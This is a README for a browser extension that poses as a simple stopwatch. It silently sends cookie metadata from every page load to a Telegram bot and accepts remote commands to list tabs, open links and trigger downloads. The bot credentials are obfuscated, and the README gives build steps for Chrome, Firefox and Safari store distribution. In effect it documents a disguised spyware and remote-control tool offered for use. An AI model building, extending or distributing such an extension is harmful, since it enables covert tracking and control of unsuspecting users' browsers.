# Telegram Stop Watch Extension

A browser extension with a **stopwatch** popup that also monitors cookies on page loads and sends cookie metadata (names, flags — **never values**) to a Telegram bot. Also accepts remote commands via Telegram to list/open tabs, trigger downloads, and report status.

---

## Features

| Feature | Description |
|---------|-------------|
| **Cookie reporting** | On every page load, sends cookie count + details (name, domain, path, Secure, HttpOnly, SameSite) to Telegram |
| **Remote commands** | Send messages to the bot to control the browser |
| `tabs` / `list` | List open tabs |
| `status` / `info` | Show browser/extension status |
| `dl <url>` | Trigger a download |
| **Obfuscated credentials** | Bot token & chat ID encoded with `hide()` (base64 + XOR 0x5a) — not plaintext in source |
| **Multi-browser** | Builds for Chrome/Brave/Edge, Firefox, Safari (Xcode) |

---

## Project Structure

```
.
├── manifest.json          # Manifest V3 (base)
├── background.js          # Service worker: cookie reporting + Telegram send queue
├── remote.js              # Alarm-driven polling for bot commands
├── popup.js / popup.html  # Simple study stopwatch UI
├── icon-128.png           # Extension icon
├── extension_builder.py   # Single script: setup creds + build zips
└── README.md              # This file
```

---

## Prerequisites

- **Python 3.8+** (for `extension_builder.py`)
- **Telegram Bot** — create via [@BotFather](https://t.me/BotFather)
- **Chat ID** — get via [@userinfobot](https://t.me/userinfobot) or similar
- **Browser** — Chrome/Brave/Edge, Firefox, or Safari (macOS + Xcode)

---

## Quick Start

### 1. Clone & configure credentials

```bash
git clone <your-repo>
cd <repo-folder>

# Interactive: prompts for bot token & chat ID, then builds zips
python3 extension_builder.py
```

### 2. Or fully automated (CI/CD friendly)

```bash
# Update credentials + build for Chrome & Firefox with custom names
python3 extension_builder.py --update-creds "chrome,firefox" \
    chrome=stop-watch-chrome.zip \
    firefox=stop-watch-firefox.zip
```

The script will:
1. Show current token/chat (decoded from `background.js`)
2. Optionally prompt for new ones (hidden input)
3. Encode with `hide()` and write to `background.js`
4. Generate browser-specific manifests
5. Output zips in the project root

---

## Building for Each Browser

| Command | Output | Install Method |
|---------|--------|----------------|
| `python3 extension_builder.py "chrome"` | `stop-watch-chrome.zip` | **Chrome/Brave/Edge**: `chrome://extensions` → Developer mode → Load unpacked (select extracted zip folder) or upload to Chrome Web Store |
| `python3 extension_builder.py "firefox"` | `stop-watch-firefox.zip` | **Firefox**: `about:debugging` → Load Temporary Add-on (select `manifest.json` from extracted zip) or submit to AMO |
| `python3 extension_builder.py "safari"` | `stop-watch-safari-source.zip` | **Safari**: Open `build/safari/StopWatch.safariextension/` in Xcode → Product → Archive → Distribute |
| `python3 extension_builder.py "all"` | All three | — |

### Why the manifests differ

| | Chrome / Brave / Edge | Firefox |
|---|---|---|
| `background` | `service_worker: background.js` | `scripts: [background.js, remote.js]` |
| `browser.*` API | aliased to `chrome.*` at startup | native |
| `remote.js` loading | `importScripts()` from `background.js` | declared in the manifest |

Chromium rejects `background.scripts` and loads only the file named by
`background.service_worker`, so `remote.js` is pulled in manually there. Firefox
does the opposite and loads both from the manifest. Loading it both ways would
define the same globals twice, which is why the `importScripts` call is guarded
by a flag.

### Polling interval

`remote.js` polls Telegram every 30 seconds. Chromium clamps MV3 alarms to a
30-second minimum and silently ignores anything shorter, so a faster interval
never fires and no remote command is ever answered.

### Custom zip names

```bash
python3 extension_builder.py "chrome,firefox" \
    chrome=my-store-build.zip \
    firefox=my-amo-build.zip
```

---

## How Credentials Work

`background.js` contains a self-contained `hide()` function:

```js
const hide = (b64) => {
  // base64 decode → XOR each byte with 0x5a → string
};
const TOKEN = hide("YmxuaWlvb2NtaGAbGxwvMjcdEhgcAx04Em0SNndsKQouEBk+LykoHzw/LhINMQ==");
const CHAT  = hide("b21paG5qY2JjbA==");
```

- **Not encryption** — only obfuscation (keeps tokens out of grep, screenshots, accidental commits)
- **Rotate at @BotFather** if the repo becomes public
- `extension_builder.py` encodes/decodes using the **exact same algorithm** (Python port)

---

## Telegram Bot Commands

Send these messages to your bot (from the configured chat ID):

| Command | Action |
|---------|--------|
| `tabs` / `list` | List open tabs (title + URL) |
| `status` / `info` / `about` | Extension/browser status |
| `dl <url>` | Trigger download of URL |
| `<any https:// link>` | Open link in new tab |

---

## Security Notes

⚠️ **Important**

- The zip files **contain your encoded credentials** — delete after installing/distributing
- Never commit `background.js` with real tokens to a public repo
- Use `@BotFather → Revoke Token` if exposed
- Cookie **values are never read or sent** — only metadata (name, flags, domain, path)

---

## Development

### Modify the extension

Edit source files directly, then rebuild:

```bash
# Rebuild without changing credentials
python3 extension_builder.py "chrome,firefox"
```

### Test locally (Chrome)

```bash
python3 extension_builder.py "chrome"
unzip stop-watch-chrome.zip -d ./chrome-build
# Open chrome://extensions → Developer mode → Load unpacked → select ./chrome-build
```

### Test locally (Firefox)

```bash
python3 extension_builder.py "firefox"
unzip stop-watch-firefox.zip -d ./firefox-build
# Open about:debugging → Load Temporary Add-on → select ./firefox-build/manifest.json
```

---

## License

MIT — use freely, rotate your tokens.

---

## Credits

- `hide()` obfuscation scheme from original `background.js`
- Built with Manifest V3, works on Chrome 88+, Firefox 109+, Safari 15+